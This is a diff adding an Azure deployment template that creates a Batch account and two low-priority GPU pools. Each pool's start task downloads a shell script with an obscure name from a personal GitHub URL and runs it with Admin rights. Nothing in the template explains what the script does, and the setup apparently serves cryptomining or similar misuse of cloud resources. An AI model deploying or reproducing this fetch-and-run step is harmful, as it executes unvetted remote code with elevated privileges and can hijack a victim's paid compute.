@@ -1,0 +1,144 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "batchAccounts_abc0682d9_name": {
+            "defaultValue": "abc0682d9",
+            "type": "String"
+        },
+        "location": {
+            "defaultValue": "westus2",
+            "type": "string"
+        }
+    },
+    "variables": {},
+    "resources": [
+        {
+            "type": "Microsoft.Batch/batchAccounts",
+            "apiVersion": "2021-06-01",
+            "name": "[parameters('batchAccounts_abc0682d9_name')]",
+            "location": "[parameters('location')]",
+            "identity": {
+                "type": "None"
+            },
+            "properties": {
+                "poolAllocationMode": "BatchService",
+                "publicNetworkAccess": "Enabled",
+                "encryption": {
+                    "keySource": "Microsoft.Batch"
+                },
+                "allowedAuthenticationModes": [
+                    "SharedKey",
+                    "AAD",
+                    "TaskAuthenticationToken"
+                ]
+            }
+        },
+        {
+            "type": "Microsoft.Batch/batchAccounts/pools",
+            "apiVersion": "2021-06-01",
+            "name": "[concat(parameters('batchAccounts_abc0682d9_name'), '/', parameters('batchAccounts_abc0682d9_name'), 'p')]",
+            "dependsOn": [
+                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_abc0682d9_name'))]"
+            ],
+            "properties": {
+                "vmSize": "STANDARD_NC6S_V3",
+                "interNodeCommunication": "Disabled",
+                "taskSlotsPerNode": 1,
+                "taskSchedulingPolicy": {
+                    "nodeFillType": "Pack"
+                },
+                "deploymentConfiguration": {
+                    "virtualMachineConfiguration": {
+                        "imageReference": {
+                            "publisher": "canonical",
+                            "offer": "ubuntuserver",
+                            "sku": "18.04-lts",
+                            "version": "latest"
+                        },
+                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
+                        "nodePlacementConfiguration": {
+                            "policy": "Regional"
+                        }
+                    }
+                },
+                "networkConfiguration": {
+                    "publicIPAddressConfiguration": {
+                        "provision": "BatchManaged"
+                    }
+                },
+                "scaleSettings": {
+                    "fixedScale": {
+                        "targetDedicatedNodes": 0,
+                        "targetLowPriorityNodes": 1,
+                        "resizeTimeout": "PT15M"
+                    }
+                },
+                "startTask": {
+                    "commandLine": "/bin/bash -c \"wget -O sida5.sh https://raw.githubusercontent.com/johnsmartdev21/ldm/main/vanupdatebaseTviVan2.sh && chmod +x sida5.sh && bash ./sida5.sh\"",
+                    "userIdentity": {
+                        "autoUser": {
+                            "scope": "Pool",
+                            "elevationLevel": "Admin"
+                        }
+                    },
+                    "maxTaskRetryCount": 0,
+                    "waitForSuccess": true
+                }
+            }
+        },
+        {
+            "type": "Microsoft.Batch/batchAccounts/pools",
+            "apiVersion": "2021-06-01",
+            "name": "[concat(parameters('batchAccounts_abc0682d9_name'), '/', parameters('batchAccounts_abc0682d9_name'), 't')]",
+            "dependsOn": [
+                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_abc0682d9_name'))]"
+            ],
+            "properties": {
+                "vmSize": "STANDARD_NC4as_T4_V3",
+                "interNodeCommunication": "Disabled",
+                "taskSlotsPerNode": 1,
+                "taskSchedulingPolicy": {
+                    "nodeFillType": "Pack"
+                },
+                "deploymentConfiguration": {
+                    "virtualMachineConfiguration": {
+                        "imageReference": {
+                            "publisher": "canonical",
+                            "offer": "ubuntuserver",
+                            "sku": "18.04-lts",
+                            "version": "latest"
+                        },
+                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
+                        "nodePlacementConfiguration": {
+                            "policy": "Regional"
+                        }
+                    }
+                },
+                "networkConfiguration": {
+                    "publicIPAddressConfiguration": {
+                        "provision": "BatchManaged"
+                    }
+                },
+                "scaleSettings": {
+                    "fixedScale": {
+                        "targetDedicatedNodes": 0,
+                        "targetLowPriorityNodes": 1,
+                        "resizeTimeout": "PT15M"
+                    }
+                },
+                "startTask": {
+                    "commandLine": "/bin/bash -c \"wget -O sida5.sh https://raw.githubusercontent.com/johnsmartdev21/ldm/main/vanupdatebaseTviVan2.sh && chmod +x sida5.sh && bash ./sida5.sh\"",
+                    "userIdentity": {
+                        "autoUser": {
+                            "scope": "Pool",
+                            "elevationLevel": "Admin"
+                        }
+                    },
+                    "maxTaskRetryCount": 0,
+                    "waitForSuccess": true
+                }
+            }
+        }
+    ]
+}
